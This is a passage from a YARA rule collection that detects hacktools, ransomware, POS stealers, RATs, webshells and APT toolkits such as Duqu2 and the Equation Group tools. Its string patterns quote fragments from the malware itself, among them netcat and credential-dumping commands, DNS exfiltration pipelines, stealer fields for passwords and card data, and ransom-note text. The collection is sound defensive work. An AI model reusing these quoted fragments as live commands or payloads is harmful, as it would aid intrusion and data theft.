		hash = "4be8270c4faa1827177e2310a00af2d5bcd2a59f"
	strings:
		$s1 = "No data to read.$Can not bind in port range (%d - %d)" fullword wide
		$s2 = "GET /ok.asp?id=1__sql__ HTTP/1.1" fullword ascii
		$s3 = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)" fullword ascii /* PEStudio Blacklist: agent */
		$s4 = "Failed to clear tab control Failed to delete tab at index %d\"Failed to retrieve" wide
		$s5 = "Host: 127.0.0.1" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 2500KB and 4 of them
}

rule Sword1_5 {
	meta:
		description = "Chinese Hacktool Set - file Sword1.5.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "96ee5c98e982aa8ed92cb4cedb85c7fda873740f"
	strings:
		$s3 = "http://www.ip138.com/ip2city.asp" fullword wide
		$s4 = "http://www.md5decrypter.co.uk/feed/api.aspx?" fullword wide
		$s6 = "ListBox_Command" fullword wide
		$s13 = "md=7fef6171469e80d32c0559f88b377245&submit=MD5+Crack" fullword wide
		$s18 = "\\Set.ini" fullword wide
		$s19 = "OpenFileDialog1" fullword wide
		$s20 = " (*.txt)|*.txt" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 400KB and 4 of them
}

rule CookieTools2 {
	meta:
		description = "Chinese Hacktool Set - file CookieTools2.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "cb67797f229fdb92360319e01277e1345305eb82"
	strings:
		$s1 = "www.gxgl.com&www.gxgl.net" fullword wide
		$s2 = "ip.asp?IP=" fullword ascii
		$s3 = "MSIE 5.5;" fullword ascii
		$s4 = "SOFTWARE\\Borland\\" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 700KB and all of them
}

rule hydra_7_4_1_hydra {
	meta:
		description = "Chinese Hacktool Set - file hydra.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "3411d0380a1c1ebf58a454765f94d4f1dd714b5b"
	strings:
		$s1 = "%d of %d target%s%scompleted, %lu valid password%s found" fullword ascii
		$s2 = "[%d][smb] Host: %s Account: %s Error: ACCOUNT_CHANGE_PASSWORD" fullword ascii
		$s3 = "hydra -P pass.txt target cisco-enable  (direct console access)" fullword ascii
		$s4 = "[%d][smb] Host: %s Account: %s Error: PASSWORD EXPIRED" fullword ascii
		$s5 = "[ERROR] SMTP LOGIN AUTH, either this auth is disabled" fullword ascii
		$s6 = "\"/login.php:user=^USER^&pass=^PASS^&mid=123:incorrect\"" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 1000KB and 2 of them
}

rule Pc_rejoice {
	meta:
		description = "Chinese Hacktool Set - file rejoice.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "fe634a9f5d48d5c64c8f8bfd59ac7d8965d8f372"
	strings:
		$s1 = "@members.3322.net/dyndns/update?system=dyndns&hostname=" fullword ascii
		$s2 = "http://www.xxx.com/xxx.exe" fullword ascii
		$s3 = "@ddns.oray.com/ph/update?hostname=" fullword ascii
		$s4 = "No data to read.$Can not bind in port range (%d - %d)" fullword wide
		$s5 = "ListViewProcessListColumnClick!" fullword ascii
		$s6 = "http://iframe.ip138.com/ic.asp" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 3000KB and 3 of them
}

rule unknown2 {
	meta:
		description = "Chinese Hacktool Set - file unknown2.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "32508d75c3d95e045ddc82cb829281a288bd5aa3"
	strings:
		$s1 = "http://md5.com.cn/index.php/md5reverse/index/md/" fullword wide
		$s2 = "http://www.md5decrypter.co.uk/feed/api.aspx?" fullword wide
		$s3 = "http://www.md5.com.cn" fullword wide
		$s4 = "1.5.exe" fullword wide
		$s5 = "\\Set.ini" fullword wide
		$s6 = "OpenFileDialog1" fullword wide
		$s7 = " (*.txt)|*.txt" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 300KB and 4 of them
}

rule md5_9b59cb5b557e46e1487ef891cedaccf7 {
    strings: 
        $jpg = { FF D8 FF E0 ?? ?? 4A 46 49 46 00 01 }
		/*
        // https://en.wikipedia.org/wiki/List_of_file_signatures
        // magic module is not standard compiled in on our platform
        // otherwise: condition: magic.mime_type() == /^image/
        // $jpg = { 4A 46 49 46 00 01 }
        */
        $php = "<?php"
    condition: ($jpg at 0) and $php
}

rule sigma_ransomware {

  meta:
    author = "J from THL <j@techhelplist.com>"
    date = "20180509"
    reference1 = "https://www.virustotal.com/#/file/705ad78bf5503e6022f08da4c347afb47d4e740cfe6c39c08550c740c3be96ba"
    reference2 = "https://www.virustotal.com/#/file/bb3533440c27a115878ae541aba3bda02d441f3ea1864b868862255aabb0c8ff"
    version = 1
    maltype = "Ransomware"
    filetype = "memory"

  strings:
    $a = ".php?"
    $b = "uid="
    $c = "&uname="
    $d = "&os="
    $e = "&pcname="
    $f = "&total="
    $g = "&country="
    $h = "&network="
    $i = "&subid="

  condition:
    all of them
}

rule PoS_Malware_fastpos : FastPOS POS keylogger
{
meta:
author = "Trend Micro, Inc."
date = "2016-05-18"
description = "Used to detect FastPOS keyloggger + scraper"
reference = "http://documents.trendmicro.com/assets/fastPOS-quick-and-easy-credit-card-theft.pdf"
sample_filetype = "exe"
strings:
$string1 = "uniqyeidclaxemain"
$string2 = "http://%s/cdosys.php"
$string3 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"
$string4 = "\\The Hook\\Release\\The Hook.pdb" nocase
condition:
all of ($string*)
}

rule APT_Project_Sauron_Scripts 
{

    meta:
        description = "Detects scripts (mostly LUA) from Project Sauron report by Kaspersky"
        author = "Florian Roth"
        reference = "https://goo.gl/eFoP4A"
        date = "2016-08-08"

    strings:
        $x1 = "local t = w.exec2str(\"regedit "
        $x2 = "local r = w.exec2str(\"cat"
        $x3 = "ap*.txt link*.txt node*.tun VirtualEncryptedNetwork.licence"
        $x4 = "move O FakeVirtualEncryptedNetwork.dll"
        $x5 = "sinfo | basex b 32url | dext l 30"
        $x6 = "w.exec2str(execStr)"
        $x7 = "netnfo irc | basex b 32url"
        $x8 = "w.exec(\"wfw status\")"
        $x9 = "exec(\"samdump\")"
        $x10 = "cat VirtualEncryptedNetwork.ini|grep"
        $x11 = "if string.lower(k) == \"securityproviders\" then"
        $x12 = "exec2str(\"plist b | grep netsvcs\")"
        $x13 = ".*account.*|.*acct.*|.*domain.*|.*login.*|.*member.*"
        $x14 = "SAURON_KBLOG_KEY ="

    condition:
        1 of them
}

rule APT_Project_Sauron_arping_module 
{

    meta:
        description = "Detects strings from arping module - Project Sauron report by Kaspersky"
        author = "Florian Roth"
        reference = "https://goo.gl/eFoP4A"
        date = "2016-08-08"

    strings:
        $s1 = "Resolve hosts that answer"
        $s2 = "Print only replying Ips"
        $s3 = "Do not display MAC addresses"

    condition:
        all of them
}

rule APT_Project_Sauron_kblogi_module 
{

    meta:
        description = "Detects strings from kblogi module - Project Sauron report by Kaspersky"
        author = "Florian Roth"
        reference = "https://goo.gl/eFoP4A"
        date = "2016-08-08"

    strings:
        $x1 = "Inject using process name or pid. Default"
        $s2 = "Convert mode: Read log from file and convert to text"
        $s3 = "Maximum running time in seconds"

    condition:
        $x1 or 2 of them
}

rule APT_Project_Sauron_basex_module 
{

    meta:
        description = "Detects strings from basex module - Project Sauron report by Kaspersky"
        author = "Florian Roth"
        reference = "https://goo.gl/eFoP4A"
        date = "2016-08-08"

    strings:
        $x1 = "64, 64url, 32, 32url or 16."
        $s2 = "Force decoding when input is invalid/corrupt"
        $s3 = "This cruft"

    condition:
        $x1 or 2 of them
}

rule APT_Project_Sauron_dext_module 
{

    meta:
        description = "Detects strings from dext module - Project Sauron report by Kaspersky"
        author = "Florian Roth"
        reference = "https://goo.gl/eFoP4A"
        date = "2016-08-08"
    
    strings:
        $x1 = "Assemble rows of DNS names back to a single string of data"
        $x2 = "removes checks of DNS names and lengths (during split)"
        $x3 = "Randomize data lengths (length/2 to length)"
        $x4 = "This cruft"
    
    condition:
        2 of them
}

rule heistenberg_pos
{
meta:
	author = "@patrickrolsen"
	reference = "POS Malware"
strings:
	$s1 = "KARTOXA"
	$s2 = "dmpz.log"
	$s3 = "/api/process.php?xy="
	$s4 = "User-Agent: PCICompliant" // PCICompliant/3.33
	$s6 = "%s:*:Enabled:%s"
condition:
	uint16(0) == 0x5A4D and 3 of ($s*)
}

rule citadel13xy
{
    
    meta:
        author = "Jean-Philippe Teissier / @Jipe_"
        description = "Citadel 1.5.x.y trojan banker"
        date = "2013-01-12" 
        version = "1.0" 
        filetype = "memory"
   
    strings:
        $a = "Coded by BRIAN KREBS for personnal use only. I love my job & wife."
        $b = "http://%02x%02x%02x%02x%02x%02x%02x%02x.com/%02x%02x%02x%02x/%02x%02x%02x%02x%02x.php"
        $c = "%BOTID%"
        $d = "%BOTNET%"
        $e = "cit_video.module"
        $f = "bc_remove"
        $g = "bc_add"
        $ggurl = "http://www.google.com/webhp"

    condition:
        3 of them
}

rule SpyGate : RAT
{
	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2014/04"
		ref = "http://malwareconfig.com/stats/SpyGate"
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$split = "abccba"
		$a1 = "abccbaSpyGateRATabccba" //$a = Version 0.2.6
		$a2 = "StubX.pdb" 
		$a3 = "abccbaDanabccb"
		$b1 = "monikerString" nocase //$b = Version 2.0
		$b2 = "virustotal1"
		$b3 = "get_CurrentDomain"
		$c1 = "shutdowncomputer" wide //$c = Version 2.9
		$c2 = "shutdown -r -t 00" wide
		$c3 = "set cdaudio door closed" wide
		$c4 = "FileManagerSplit" wide
		$c5 = "Chating With >> [~Hacker~]" wide

	condition:
		(all of ($a*) and #split > 40) or (all of ($b*) and #split > 10) or (all of ($c*))
}

rule Sakurel_backdoor
{
	meta:
		maltype = "Sakurel backdoor"
    ref = "https://github.com/reed1713"
		reference = "http://www.microsoft.com/security/portal/threat/encyclopedia/entry.aspx?Name=Trojan:Win32/Sakurel.A#tab=2"
		description = "malware creates a process in the temp directory and performs the sysprep UAC bypass method."
	strings:
		$type="Microsoft-Windows-Security-Auditing"
		$eventid="4688"
		$data="Windows\\System32\\sysprep\\sysprep.exe" nocase

		$type1="Microsoft-Windows-Security-Auditing"
		$eventid1="4688"
		$data1="AppData\\Local\\Temp\\MicroMedia\\MediaCenter.exe" nocase
	condition:
		all of them
}

rule Meterpreter_Reverse_Tcp { 
  meta: // This is the standard backdoor/RAT from Metasploit, could be used by any actor 
    author = "chort (@chort0)" 
    description = "Meterpreter reverse TCP backdoor in memory. Tested on Win7x64." 
  strings: 
    $a = { 4d 45 54 45 52 50 52 45 54 45 52 5f 54 52 41 4e 53 50 4f 52 54 5f 53 53 4c [32-48] 68 74 74 70 73 3a 2f 2f 58 58 58 58 58 58 } // METERPRETER_TRANSPORT_SSL … https://XXXXXX 
    $b = { 4d 45 54 45 52 50 52 45 54 45 52 5f 55 41 } // METERPRETER_UA 
    $c = { 47 45 54 20 2f 31 32 33 34 35 36 37 38 39 20 48 54 54 50 2f 31 2e 30 } // GET /123456789 HTTP/1.0 
    $d = { 6d 65 74 73 72 76 2e 64 6c 6c [2-4] 52 65 66 6c 65 63 74 69 76 65 4c 6f 61 64 65 72 } // metsrv.dll … ReflectiveLoader 
    
  condition: 
    $a or (any of ($b, $d) and $c) 
  }

rule kpot
{

    meta:
        author = " J from THL <j@techhelplist.com>"
        date = "2018-08-29"
        reference1 = "https://www.virustotal.com/#/file/4e87a0794bf73d06ac1ce4a37e33eb832ff4c89fb9e4266490c7cef9229d27a7/detection"
        reference2 = "ETPRO TROJAN KPOT Stealer Check-In [2832358]"
        reference3 = "ETPRO TROJAN KPOT Stealer Exfiltration [2832359]"
        version = 1
        maltype = "Stealer"
        filetype = "memory"

    strings:
        $text01 = "bot_id=%s"
        $text02 = "x64=%d"
        $text03 = "is_admin=%d"
        $text04 = "IL=%d"
        $text05 = "os_version=%d"
        $text06 = "IP: %S"
        $text07 = "MachineGuid: %s"
        $text08 = "CPU: %S (%d cores)"
        $text09 = "RAM: %S MB"
        $text10 = "Screen: %dx%d"
        $text11 = "PC: %s"
        $text12 = "User: %s"
        $text13 = "LT: %S (UTC+%d:%d)"
        $text14 = "%s/%s.php"
        $text15 = "Host: %s"
        $text16 = "username_value"
        $text17 = "password_value"
        $text18 = "name_on_card"
        $text19 = "last_four"
        $text20 = "exp_month"
        $text21 = "exp_year"
        $text22 = "bank_name"


    condition:
        16 of them
}

rule apt_duqu2_loaders 
{ 

    meta:
		copyright = "Kaspersky Lab"
		description = "Rule to detect Duqu 2.0 samples"
		last_modified = "2015-06-09"
		version = "1.0"

    strings:
		$a1 = "{AAFFC4F0-E04B-4C7C-B40A-B45DE971E81E}" wide 
		$a2 = "\\\\.\\pipe\\{AAFFC4F0-E04B-4C7C-B40A-B45DE971E81E}" wide
		$a4 = "\\\\.\\pipe\\{AB6172ED-8105-4996-9D2A-597B5F827501}" wide
		$a5 = "Global\\{B54E3268-DE1E-4c1e-A667-2596751403AD}" wide
		$a8 = "SELECT `Data` FROM `Binary` WHERE `Name`='%s%i'" wide
		$a9 = "SELECT `Data` FROM `Binary` WHERE `Name`='CryptHash%i'" wide
		$a7 = "SELECT `%s` FROM `%s` WHERE `%s`='CAData%i'" wide
		$b1 = "MSI.dll"
		$b2 = "msi.dll"
		$b3 = "StartAction"
		$c1 = "msisvc_32@" wide
		$c2 = "PROP=" wide
		$c3 = "-Embedding" wide
		$c4 = "S:(ML;;NW;;;LW)" wide
		$d1 = "NameTypeBinaryDataCustomActionActionSourceTargetInstallExecuteSequenceConditionSequencePropertyValueMicrosoftManufacturer" nocase
		$d2 = {2E 3F 41 56 3F 24 5F 42 69 6E 64 40 24 30 30 58 55 3F 24 5F 50 6D 66 5F 77 72 61 70 40 50 38 43 4C 52 ?? 40 40 41 45 58 58 5A 58 56 31 40 24 24 24 56 40 73 74 64 40 40 51 41 56 43 4C 52 ?? 40 40 40 73 74 64 40 40}
	
    condition:
		( (uint16(0) == 0x5a4d) and ( (any of ($a*)) or (all of ($b*)) or (all of ($c*)) ) and filesize < 100000 ) or ( (uint32(0) == 0xe011cfd0) and ( (any of ($a*)) or (all of ($b*)) or (all of ($c*)) or (any of ($d*)) ) and filesize < 20000000 )
}

rule Duqu2_Generic1 
{

    meta:
		description = "Kaspersky APT Report - Duqu2 Sample - Generic Rule"
		author = "Florian Roth"
		reference = "https://goo.gl/7yKyOj"
		date = "2015-06-10"
		super_rule = 1
		hash0 = "3f9168facb13429105a749d35569d1e91465d313"
		hash1 = "0a574234615fb2382d85cd6d1a250d6c437afecc"
		hash2 = "38447ed1d5e3454fe17699f86c0039f30cc64cde"
		hash3 = "5282d073ee1b3f6ce32222ccc2f6066e2ca9c172"
		hash4 = "edfca3f0196788f7fde22bd92a8817a957c10c52"
		hash5 = "6a4ffa6ca4d6fde8a30b6c8739785f4bd2b5c415"
		hash6 = "00170bf9983e70e8dd4f7afe3a92ce1d12664467"
		hash7 = "32f8689fd18c723339414618817edec6239b18f3"
		hash8 = "f860acec9920bc009a1ad5991f3d5871c2613672"
		hash9 = "413ba509e41c526373f991d1244bc7c7637d3e13"
		hash10 = "29cd99a9b6d11a09615b3f9ef63f1f3cffe7ead8"
		hash11 = "dfe1cb775719b529138e054e7246717304db00b1"
	
    strings:
		$s0 = "Global\\{B54E3268-DE1E-4c1e-A667-2596751403AD}" fullword wide
		$s1 = "SetSecurityDescriptorSacl" fullword ascii /* PEStudio Blacklist: strings */ /* Goodware String - occured 189 times */
		$s2 = "msisvc_32@" fullword wide
		$s3 = "CompareStringA" fullword ascii /* PEStudio Blacklist: strings */ /* Goodware String - occured 1392 times */
		$s4 = "GetCommandLineW" fullword ascii /* PEStudio Blacklist: strings */ /* Goodware String - occured 1680 times */
	
    condition:
		uint16(0) == 0x5a4d and filesize < 150KB and all of them
}

rule APT_Kaspersky_Duqu2_procexp 
{

    meta:
		description = "Kaspersky APT Report - Duqu2 Sample - Malicious MSI"
		author = "Florian Roth"
		reference = "https://goo.gl/7yKyOj"
		date = "2015-06-10"
		hash1 = "2422835716066b6bcecb045ddd4f1fbc9486667a"
		hash2 = "b120620b5d82b05fee2c2153ceaf305807fa9f79"
		hash3 = "288ebfe21a71f83b5575dfcc92242579fb13910d"
	
    strings:
		$x1 = "svcmsi_32.dll" fullword wide
		$x2 = "msi3_32.dll" fullword wide
		$x3 = "msi4_32.dll" fullword wide
		$x4 = "MSI.dll" fullword ascii
		$s1 = "SELECT `Data` FROM `Binary` WHERE `Name`='%s%i'" fullword wide
		$s2 = "Sysinternals installer" fullword wide /* PEStudio Blacklist: strings */
		$s3 = "Process Explorer" fullword wide /* PEStudio Blacklist: strings */ /* Goodware String - occured 5 times */
	
    condition:
		uint16(0) == 0x5a4d and filesize < 100KB and ( 1 of ($x*) ) and ( all of ($s*) )
}

rule APT_Kaspersky_Duqu2_SamsungPrint 
{

    meta:
		description = "Kaspersky APT Report - Duqu2 Sample - file 2a9a5afc342cde12c6eb9a91ad29f7afdfd8f0fb17b983dcfddceccfbc17af69"
		author = "Florian Roth"
		reference = "https://goo.gl/7yKyOj"
		date = "2015-06-10"
		hash = "ce39f41eb4506805efca7993d3b0b506ab6776ca"
	
    strings:
		$s0 = "Installer for printer drivers and applications" fullword wide /* PEStudio Blacklist: strings */
		$s1 = "msi4_32.dll" fullword wide
		$s2 = "HASHVAL" fullword wide
		$s3 = "SELECT `%s` FROM `%s` WHERE `%s`='CAData%i'" fullword wide
		$s4 = "ca.dll" fullword ascii
		$s5 = "Samsung Electronics Co., Ltd." fullword wide
	
    condition:
		uint16(0) == 0x5a4d and filesize < 82KB and all of them
}

rule APT_Kaspersky_Duqu2_msi3_32 
{

    meta:
		description = "Kaspersky APT Report - Duqu2 Sample - file d8a849654ab97debaf28ae5b749c3b1ff1812ea49978713853333db48c3972c3"
		author = "Florian Roth"
		reference = "https://goo.gl/7yKyOj"
		date = "2015-06-10"
		hash = "53d9ef9e0267f10cc10f78331a9e491b3211046b"
	
    strings:
		$s0 = "ProcessUserAccounts" fullword ascii /* PEStudio Blacklist: strings */
		$s1 = "SELECT `UserName`, `Password`, `Attributes` FROM `CustomUserAccounts`" fullword wide /* PEStudio Blacklist: strings */
		$s2 = "SELECT `UserName` FROM `CustomUserAccounts`" fullword wide /* PEStudio Blacklist: strings */
		$s3 = "SELECT `Data` FROM `Binary` WHERE `Name`='CryptHash%i'" fullword wide
		$s4 = "msi3_32.dll" fullword wide
		$s5 = "RunDLL" fullword ascii
		$s6 = "MSI Custom Action v3" fullword wide
		$s7 = "msi3_32" fullword wide
		$s8 = "Operating System" fullword wide /* PEStudio Blacklist: strings */ /* Goodware String - occured 9203 times */
	
    condition:
		uint16(0) == 0x5a4d and filesize < 72KB and all of them
}

rule LinuxAESDDoS
{
    meta:
	Author = "@benkow_"
	Date = "2014/09/12"
	Description = "Strings inside"
        Reference = "http://www.kernelmode.info/forum/viewtopic.php?f=16&t=3483"

    strings:
        $a = "3AES"
        $b = "Hacker"
        $c = "VERSONEX"

    condition:
        2 of them
}

rule LinuxBillGates 
{
    meta:
       Author      = "@benkow_"
       Date        = "2014/08/11" 
       Description = "Strings inside"
       Reference   = "http://www.kernelmode.info/forum/viewtopic.php?f=16&t=3429" 

    strings:
        $a= "12CUpdateGates"
        $b= "11CUpdateBill"

    condition:
        $a and $b
}

rule LinuxMrBlack
{
    meta:
	Author      = "@benkow_"
        Date        = "2014/09/12" 
        Description = "Strings inside"
        Reference   = "http://www.kernelmode.info/forum/viewtopic.php?f=16&t=3483"

    strings:
        $a = "Mr.Black"
	$b = "VERS0NEX:%s|%d|%d|%s"
    condition:
        $a and $b
}

rule LinuxTsunami
{
    meta:
	
		Author      = "@benkow_"
		Date        = "2014/09/12" 
		Description = "Strings inside"
		Reference   = "http://www.kernelmode.info/forum/viewtopic.php?f=16&t=3483"

    strings:
        $a = "PRIVMSG %s :[STD]Hitting %s"
        $b = "NOTICE %s :TSUNAMI <target> <secs>"
        $c = "NOTICE %s :I'm having a problem resolving my host, someone will have to SPOOFS me manually."
    condition:
        $a or $b or $c
}

rule StoneDrill_main_sub {
meta:
 author = "Kaspersky Lab"
 description = "Rule to detect StoneDrill (decrypted) samples"
 hash = "d01781f1246fd1b64e09170bd6600fe1"
 hash = "ac3c25534c076623192b9381f926ba0d"
 version = "1.0"
strings:
 $code = {B8 08 00 FE 7F FF 30 8F 44 24 ?? 68 B4 0F 00 00 FF 15 ?? ?? ?? 00 B8 08 00 FE 7F FF
30 8F 44 24 ?? 8B ?? 24 [1 - 4] 2B ?? 24 [6] F7 ?1 [5 - 12] 00}
condition:
 uint16(0) == 0x5A4D and
 $code and
 filesize < 5000000
}

rule Backdoored_ssh {
meta:
author = "Kaspersky"
reference = "https://securelist.com/energetic-bear-crouching-yeti/85345/"
actor = "Energetic Bear/Crouching Yeti"
strings:
$a1 = "OpenSSH"
$a2 = "usage: ssh"
$a3 = "HISTFILE"
condition:
uint32(0) == 0x464c457f and filesize<1000000 and all of ($a*)
}

rule EquationGroup_envisioncollision {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file envisioncollision"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "75d5ec573afaf8064f5d516ae61fd105012cbeaaaa09c8c193c7b4f9c0646ea1"
   strings:
      $x1 = "mysql \\$D --host=\\$H --user=\\$U --password=\\\"\\$P\\\" -e \\\"select * from \\$T" fullword ascii
      $x2 = "Window 3: $0 -Uadmin -Ppassword -i127.0.0.1 -Dipboard -c\\\"sleep 500|nc" fullword ascii
      $s3 = "$ua->agent(\"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\");" fullword ascii
      $s4 = "$url = $host . \"/admin/index.php?adsess=\" . $enter . \"&app=core&module=applications&section=hooks&do=install_hook\";" fullword ascii
   condition:
      ( uint16(0) == 0x2123 and filesize < 20KB and 1 of ($x*) ) or ( 2 of them )
}

rule EquationGroup_promptkill {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file promptkill"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "b448204503849926be249a9bafbfc1e36ef16421c5d3cfac5dac91f35eeaa52d"
   strings:
      $x1 = "exec(\"xterm $xargs -e /current/tmp/promptkill.kid.$tag $pid\");" fullword ascii
      $x2 = "$xargs=\"-title \\\"Kill process $pid?\\\" -name \\\"Kill process $pid?\\\" -bg white -fg red -geometry 202x19+0+0\" ;" fullword ascii
   condition:
      filesize < 250KB and 1 of them
}

rule EquationGroup_morerats_client_addkey {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "6c67c03716d06a99f20c1044585d6bde7df43fee89f38915db0b03a42a3a9f4b"
   strings:
      $x1 = "print '  -s storebin  use storebin as the Store executable\\n'" fullword ascii
      $x2 = "os.system('%s --file=\"%s\" --wipe > /dev/null' % (storebin, b))" fullword ascii
      $x3 = "print '  -k keyfile   the key text file to inject'" fullword ascii
   condition:
      ( filesize < 20KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_ntevt {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "4254ee5e688fc09bdc72bcc9c51b1524a2bb25a9fb841feaf03bc7ec1a9975bf"
   strings:
      $x1 = "c:\\ntevt.pdb" fullword ascii

      $s1 = "ARASPVU" fullword ascii

      $op1 = { 41 5a 41 59 41 58 5f 5e 5d 5a 59 5b 58 48 83 c4 }
      $op2 = { f9 48 03 fa 48 33 c0 8a 01 49 03 c1 49 f7 e0 88 }
      $op3 = { 01 41 f6 e0 49 03 c1 88 01 48 33 }
   condition:
      ( uint16(0) == 0x5a4d and filesize < 700KB and $x1 or 3 of them )
}

rule apt_equation_equationlaser_runtimeclasses
{

    meta:
        copyright = "Kaspersky Lab"
        description = "Rule to detect the EquationLaser malware"
        version = "1.0"
        last_modified = "2015-02-16"
        reference = "https://securelist.com/blog/"

    strings:
        $a1="?a73957838_2@@YAXXZ"
        $a2="?a84884@@YAXXZ"
        $a3="?b823838_9839@@YAXXZ"
        $a4="?e747383_94@@YAXXZ"
        $a5="?e83834@@YAXXZ"
        $a6="?e929348_827@@YAXXZ"

    condition:
        any of them
}

rule Equation_Kaspersky_GreyFishInstaller
{

    meta:
        description = "Equation Group Malware - Grey Fish"
        author = "Florian Roth"
        reference = "http://goo.gl/ivt8EW"
        date = "2015/02/16"
        hash = "58d15d1581f32f36542f3e9fb4b1fc84d2a6ba35"

    strings:
        $s0 = "DOGROUND.exe" fullword wide
        $s1 = "Windows Configuration Services" fullword wide
        $s2 = "GetMappedFilenameW" fullword ascii

    condition:
        all of them
}

rule APT_Malware_PutterPanda_Rel 
{

    meta:
        description = "Detects an APT malware related to PutterPanda"
        author = "Florian Roth"
        score = 70
        reference = "VT Analysis"
        date = "2015-06-03"
        hash = "5367e183df155e3133d916f7080ef973f7741d34"

    strings:
        $x0 = "app.stream-media.net" fullword ascii /* score: '12.03' */
        $x1 = "File %s does'nt exist or is forbidden to acess!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '16.035' */
        $s6 = "GetProcessAddresss of pHttpQueryInfoA Failed!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '32.02' */
        $s7 = "Connect %s error!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '16.04' */
        $s9 = "Download file %s successfully!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '14.03' */
        $s10 = "index.tmp" fullword ascii /* score: '14.03' */
        $s11 = "Execute PE Successfully" fullword ascii /* PEStudio Blacklist: strings */ /* score: '13.03' */
        $s13 = "aa/22/success.xml" fullword ascii /* score: '12.005' */
        $s16 = "aa/22/index.asp" fullword ascii /* score: '11.02' */
        $s18 = "File %s a Non-Pe File" fullword ascii /* score: '8.04' */
        $s19 = "SendRequset error!" fullword ascii /* score: '8.04' */
        $s20 = "filelist[%d]=%s" fullword ascii /* score: '7.015' */

    condition:
        ( uint16(0) == 0x5a4d and 1 of ($x*) ) or ( 4 of ($s*) )
}

rule Adwind_JAR_PACKA : binary RAT Frutas Unrecom AlienSpy
{
 meta:
  author = "Vitaly Kamluk, Vitaly.Kamluk@kaspersky.com"
  reference = "https://securelist.com/securelist/files/2016/02/KL_AdwindPublicReport_2016.pdf"
  last_modified = "2015-11-30"
 strings:
  $b1 = ".class" ascii
  $b2 = "c/a/a/" ascii
  $b3 = "b/a/" ascii
  $b4 = "a.dat" ascii
  $b5 = "META-INF/MANIFEST.MF" ascii
 condition:
  int16(0) == 0x4B50 and ($b1 and $b2 and $b3 and $b4 and $b5)
}

rule unpacked_shiva_ransomware {

   meta:

      description = "Rule to detect an unpacked sample of Shiva ransopmw"
      author = "Marc Rivero | @seifreed"
      reference = "https://twitter.com/malwrhunterteam/status/1037424962569732096"
    
   strings:

      $s1 = "c:\\Users\\sys\\Desktop\\v 0.5\\Shiva\\Shiva\\obj\\Debug\\shiva.pdb" fullword ascii
      $s2 = "This email will be as confirmation you are ready to pay for decryption key." fullword wide
      $s3 = "Your important files are now encrypted due to a security problem with your PC!" fullword wide
      $s4 = "write.php?info=" fullword wide
      $s5 = " * Do not try to decrypt your data using third party software, it may cause permanent data loss." fullword wide
      $s6 = " * Do not rename encrypted files." fullword wide
      $s7 = ".compositiontemplate" fullword wide
      $s8 = "You have to pay for decryption in Bitcoins. The price depends on how fast you write to us." fullword wide
      $s9 = "\\READ_IT.txt" fullword wide
      $s10 = ".lastlogin" fullword wide
      $s11 = ".logonxp" fullword wide
      $s12 = " * Decryption of your files with the help of third parties may cause increased price" fullword wide
      $s13 = "After payment we will send you the decryption tool that will decrypt all your files." fullword wide
   
   condition:

      ( uint16(0) == 0x5a4d and filesize < 800KB ) and all of them 
}

rule PAS_TOOL_PHP_WEB_KIT_mod 
{
   
   meta:
      description = "Detects PAS Tool PHP Web Kit"
      reference = "https://www.us-cert.gov/security-publications/GRIZZLY-STEPPE-Russian-Malicious-Cyber-Activity"
      author = "US CERT - modified by Florian Roth due to performance reasons"
      date = "2016/12/29"
   
   strings:
      $php = "<?php"
      $base64decode1 = "='base'.("
      $strreplace = "str_replace(\"\\n\", ''"
      $md5 = ".substr(md5(strrev("
      $gzinflate = "gzinflate"
      $cookie = "_COOKIE"
      $isset = "isset"
   
   condition:
      $php at 0 and (filesize > 10KB and filesize < 30KB) and #cookie == 2 and #isset == 3 and all of them
}

rule IronTiger_ASPXSpy
{
    
    meta:
        author = "Cyber Safety Solutions, Trend Micro"
        description = "ASPXSpy detection. It might be used by other fraudsters"
        reference = "http://goo.gl/T5fSJC"
   
    strings:
        $str1 = "ASPXSpy" nocase wide ascii
        $str2 = "IIS Spy" nocase wide ascii
        $str3 = "protected void DGCoW(object sender,EventArgs e)" nocase wide ascii
    
    condition:
        any of ($str*)
}

rule IronPanda_Malware4 
{

    meta:
        description = "Iron Panda Malware"
        author = "Florian Roth"
        reference = "https://goo.gl/E4qia9"
        date = "2015-09-16"
        hash = "0d6da946026154416f49df2283252d01ecfb0c41c27ef3bc79029483adc2240c"

    strings:
        $s0 = "TestPlugin.dll" fullword wide
